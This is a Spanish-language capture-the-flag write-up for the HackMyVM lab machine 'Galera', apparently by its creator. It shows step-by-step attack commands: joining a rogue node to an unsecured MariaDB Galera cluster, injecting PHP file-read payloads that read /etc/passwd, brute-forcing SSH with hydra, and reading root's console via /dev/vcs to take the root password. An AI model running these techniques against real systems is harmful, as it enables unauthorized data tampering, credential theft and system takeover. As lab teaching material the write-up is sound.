---
author: Lenam
pubDatetime: 2025-05-25T00:00:00Z
title: WriteUp Galera - HackMyVM
slug: galera-writeup-hackmyvm-es
featured: true
draft: false
ogImage: "assets/galera/OpenGraph.png"
tags:
    - HackMyVM
    - Galera Cluster
    - LFI
    - Brute force
description:
    Descripción de la explotación de un clúster de Galera mal configurado en un laboratorio de HackMyVM.
lang: es
---

![Machine](/assets/galera/vm.png)

## Introducción / Motivación

Después de estar viendo los directos en Twitch de [CursosDeDesarrollo](https://blog.cursosdedesarrollo.com/) peleándose para instalar un clúster de `MariaDB` con `MariaDB Galera Cluster`, me di cuenta de que si no se protege adecuadamente el puerto de Galera (puerto `4567`), se podría crear un nodo malicioso para modificar las bases de datos del clúster. Este CTF intenta reproducir el problema, entre otras cosas. Además, como no había creado ningún CTF para [HackMyVM](https://hackmyvm.eu), esta era la oportunidad.

![HackMyVM](/assets/galera/imagenhackmyvm.png)

## Tabla de contenido

## Enumeración

```bash
ping -c 1 192.168.1.188
```

![Ping](/assets/galera/ping.png)

```bash
nmap -p- -sS -Pn -n 192.168.1.188
```

![Nmap Scan](/assets/galera/nmap.png)

```bash
nmap -p22,80,4567 -sVC -Pn -n 192.168.1.188
```

![Nmap Scan](/assets/galera/nmap2.png)

```bash
whatweb 192.168.1.188
```

![whatweb](/assets/galera/whatweb.png)

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.188 -x .php,.txt,.htm,.html,.zip
```

![Fuzz dirs](/assets/galera/fuzz-dirs.png)

## Enumeración manual

![Nmap Scan](/assets/galera/web.png)

Código fuente de la página web.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
 <img src="galera.png" alt="Galera" class="galeraimg"  >
  <h1>Login</h1>
    <form action="login.php" method="POST">
    <input type="hidden" name="token" value="66dbb62958e92d0e79635b0584dd1a77dcdfed68030f99b1cfd6c8e14c87079c">
    <label for="user">Username:</label>
    <input type="text" name="user" id="user" required maxlength="50">

    <label for="pass">Password:</label>
    <input type="password" name="pass" id="pass" required>

    <button type="submit">Sign In</button>
  </form>
</div>
</body>
</html>
```

## Intrusión

En el puerto `80`, el sitio web parece estar bien protegido y no conseguiremos nada con fuerza bruta.

En el puerto `22` tenemos SSH y será difícil conseguir algo también con fuerza bruta sin tener ningún usuario.

El puerto `4567`, si investigamos un poco, encontraremos que es utilizado por `Galera Cluster`, un sistema para hacer clúster de BD en MariaDB o MySQL. Además, la máquina tiene el nombre de `Galera`, probamos esta vía.

Más información sobre **Galera** y cómo crear un nodo para conectarnos al clúster:

- [What is MariaDB Galera Cluster?](https://mariadb.com/kb/en/what-is-mariadb-galera-cluster/)
- [MariaDB Galera Cluster](https://mariadb.com/kb/en/galera-cluster/)

### Nodo malicioso en el clúster

La idea es crear un nodo de Galera e intentar conectarlo al nodo del clúster de Galera expuesto en el puerto `4567`. Si `Galera` está configurado sin seguridad (configuración por defecto), podremos conectarnos con nuestro nodo al clúster, visualizar las BD e incluso es probable que las podamos modificar.

Utilizaremos Docker para crear un servicio de MariaDB (atacante) y configurar Galera para que se conecte al puerto `4567` del clúster del servidor (víctima).

Para que un nodo de Galera se pueda conectar al clúster, es importante que utilicen la misma versión de la librería. Al visualizar el reporte de `nmap`, podemos observar que el SO es un **Debian 12 “Bookworm”**. La versión de **MariaDB** que viene en los repositorios por defecto en `Bookworm` es la **10.11.11**, que ya incluye la librería de Galera Cluster instalada. Creamos el contenedor con esta versión.

Utilizamos `docker` y `docker compose` por comodidad y para no afectar a otras BD de nuestro host, pero podría hacerse con solo un contenedor Docker pasando los parámetros en la línea de comandos al levantar el contenedor, o con tu propia BD del host.

**docker-compose.yml**

```yaml
services:
  galera-atacante:
    image: mariadb:10.11.11
    container_name: galera-atacante
    network_mode: host  # Usamos red del host para facilitar SST (¡importante!)
    environment:
      - MARIADB_ALLOW_EMPTY_ROOT_PASSWORD=yes
      - MARIADB_ROOT_PASSWORD=
      - WSREP_SST_METHOD=rsync
    volumes:
      - ./conf.d:/etc/mysql/conf.d:ro
```

Creamos también una carpeta `conf.d` al lado del fichero `docker-compose.yml` y dentro crearemos el fichero de configuración de Galera.

**conf.d/galera.cnf**

```bash
[galera]
# Activa el modo Galera, habilitando la replicación síncrona
wsrep_on=ON

# Ruta a la librería del proveedor Galera (SMM = Shared Memory Messaging)
wsrep_provider=/usr/lib/galera/libgalera_smm.so

# Dirección de la “bootstrap list”: nodos con los que formar el cluster
# gcomm:// sin direcciones haría que espere hasta que un nodo existente lo añada
wsrep_cluster_address=gcomm://192.168.1.188  # IP del nodo “víctima” o de los nodos existentes

# Dirección IP de este nodo, usada para comunicarse con el resto del cluster
wsrep_node_address=192.168.1.181   			# IP local del contenedor o host

# Nombre lógico de este nodo dentro del cluster (cualquiera que lo identifique)
wsrep_node_name=atacante

# Formato del binlog. ROW es obligatorio para Galera, ya que replica por fila
binlog_format=ROW

# Motor de almacenamiento por defecto. InnoDB es el único compatible con Galera
default_storage_engine=InnoDB

# Modo de bloqueo para auto-incrementos:
# 2 = “interleaved” – permite generar valores AUTO_INCREMENT concurrentes
#     sin bloqueos globales, mejor rendimiento en escrituras simultáneas
innodb_autoinc_lock_mode=2

# Método de State Snapshot Transfer (SST) para nuevos nodos:
# rsync = copia de datos vía rsync, sencillo pero bloquea al nodo fuente
wsrep_sst_method=rsync
```

En la configuración de Galera no ponemos ningún nombre para el clúster, por defecto Galera ya asigna un nombre al clúster si el usuario no lo configura. Utilizamos `rsync` en `WSREP_SST_METHOD` porque no requiere usuario ni contraseña para añadir un nodo al clúster.

Por otro lado, fíjense bien en las direcciones IP de `galera.cnf` configuradas en los parámetros `wsrep_cluster_address` y `wsrep_node_address`.

Ejecutamos el docker compose ...

```bash
docker compose up -d
```

![Docker compose](/assets/galera/docker-compose.png)

... y comprobamos que el contenedor esté levantado ...

```bash
docker ps
```

y entramos dentro de la BD del contenedor.

```bash
docker exec -it galera-atacante mysql
```

Ahora dentro de nuestra BD local comprobamos que Galera se haya sincronizado enviando el siguiente comando SQL.

```sql
SHOW STATUS LIKE 'wsrep_local_state_comment';
```

![Test galera](/assets/galera/test-galera.png)

Si en `Value` aparece `Synced`, quiere decir que nuestro servidor se ha añadido como nodo al clúster de Galera, podemos ver otros parámetros de Galera con el siguiente comando SQL.

```sql
SHOW STATUS LIKE 'wsrep_%';
```

Algunos parámetros interesantes son: `wsrep_connected` que aparece como `ON`, o `wsrep_cluster_size` donde podemos ver que somos dos nodos en el clúster (no estamos solos 😁 !).

Miramos las BD que tenemos y vemos que hay una BD que no teníamos en nuestro Docker `galeradb`, entramos y vemos que hay una tabla `users`.

```sql
show databases;
```

```sql
use galeradb; show tables;
```

![SQL galera](/assets/galera/sql-galera.png)

Vemos que en la tabla existe un usuario admin, pero no conseguiremos crackear el hash de su contraseña, pero podemos añadir otros usuarios. Primero tenemos que averiguar qué tipo de hash es.

```sql
select * from users\G
```

![SQL table users](/assets/galera/table-users.png)

```bash
hashid '$2y$10$BCAQ6VSNOL9TzfE5/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq'
```

![hash id](/assets/galera/hash-id.png)

Observamos que está con bcrypt, creamos un hash para la contraseña `password`.

```bash
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt(rounds=10)).decode())"
```

![hash bcrypt](/assets/galera/hash-bcrypt.png)

y lo utilizamos para crear un nuevo usuario en nuestro nodo del clúster en Docker.

```sql
INSERT INTO users (username, email, password) VALUES ('lenam','lenam@lenam.com','$2b$10$.9rNY2PmaVl3fan4XsRCEe3IWVAeFGHGFCWx1XFnNg/fBqZwZqXfa');
```

![SQL user lenam](/assets/galera/users-lenam.png)

Nos vamos al sitio web con el formulario de login que aparecía en el puerto 80 e intentamos validar nuestro usuario creado. Conseguimos entrar a la página `private.php`.

![SQL user lenam](/assets/galera/private-web.png)

### LFI

En la página `private.php` encontramos un formulario con diferentes botones que nos permiten registrar mensajes. Si intentamos XSS o cualquier tipo de inyección no conseguiremos nada (o eso espero como creador de la máquina). Solo lo conseguiremos si manipulamos el campo `email` del usuario, lo cual solo podremos hacer mediante la modificación de la base de datos desde nuestro nodo del clúster de `Galera` atacante.

En la dirección encontrada mediante fuzzing de `/info.php`, encontramos la clásica salida de `phpInfo();` donde podemos observar diferentes cosas importantes como el parámetro `disable_functions` y que está instalado el módulo `SPL` en el servidor.

![SQL user lenam](/assets/galera/php-disable-functions.png)

Como se puede observar en `disable_functions`, tenemos prácticamente todas las funciones para conseguir RCE deshabilitadas, pero podremos utilizar `include()`, `file_put_contents()` y todas las funciones de `SPL` útiles para evadir las `disable_functions`.

Volvemos a entrar a nuestro nodo atacante de MariaDB con Galera y modificamos el email de nuestro usuario con cualquiera de estos dos payloads:

```sql 
UPDATE users SET email="<?php $f=new SplFileObject('/etc/passwd');while(!$f->eof())echo$f->fgets(); ?>" WHERE username='lenam';
```

o

```sql 
UPDATE users SET email="<?php include('/etc/passwd'); ?>" WHERE username='lenam';
```

Cerramos la sesion de nuestro usuario si la teniamos iniciada y volvemos a entrar, publicamos un mensaje cualquiera y despues hacemos clic en el boton `View`, conseguimos obtener el fichero `/etc/passwd` del servidor.

![LFI](/assets/galera/lfi.png)

Podemos observar que además de root y los típicos usuarios del SO también existe el usuario `donjuandeaustria`.

### Fuerza bruta al usuario `donjuandeaustria`

Utilizamos hydra para hacer fuerza bruta al servicio `ssh` del puerto `22` con el usuario `donjuandeaustria`.

```bash
hydra -l donjuandeaustria -P /usr/share/wordlists/rockyou.txt -f 192.168.1.188 ssh
```

y en unos pocos minutos (en mi maquina y sin poner más threads 2 o 3 minutos) obtenemos el password de `donjuandeaustria` que es `amorcito`.

Entramos mediante SSH al servidor con este usuario y contraseña y obtenemos la flag de user.txt.

```bash
ssh donjuandeaustria@192.168.1.188
```

![User flag](/assets/galera/user-flag.png)

## Escalada de privilegios

Si comprobamos los grupos a los que pertenece el usuario `id`, podremos observar que pertenece al grupo `tty`, y si observamos si hay algún usuario que haya iniciado una tty `w`, veremos que root ha iniciado una tty con bash.

![Info escalada](/assets/galera/escalada-info.png)

Al pertenecer al grupo `tty`, podemos observar la salida de la consola `tty` (lo que están viendo) de otros usuarios. Solo tenemos que consultar el contenido del fichero `/dev/vcs{n}` o `/dev/vcsa{n}`.

Si leemos el contenido del fichero `/dev/vcs20`, el tty del usuario `root`, obtenemos la contraseña de root.

```bash
cat /dev/vcs20
```

![Shell root](/assets/galera/root-password.png)

Entramos como usuario root con la contraseña obtenida y leemos la flag de root.txt.

![root flag](/assets/galera/root-flag.png)


En este laboratorio se puede observar la importancia de proteger los puertos o la red de Galera Cluster o, como mínimo, utilizar otro método SST que permita la validación por certificado o contraseña.

**Más información**

- https://galeracluster.com/library/documentation/security.html
- https://mariadb.com/kb/en/securing-communications-in-galera-cluster/#securing-galera-cluster-replication-traffic
- https://blog.cursosdedesarrollo.com/posts/post-009/


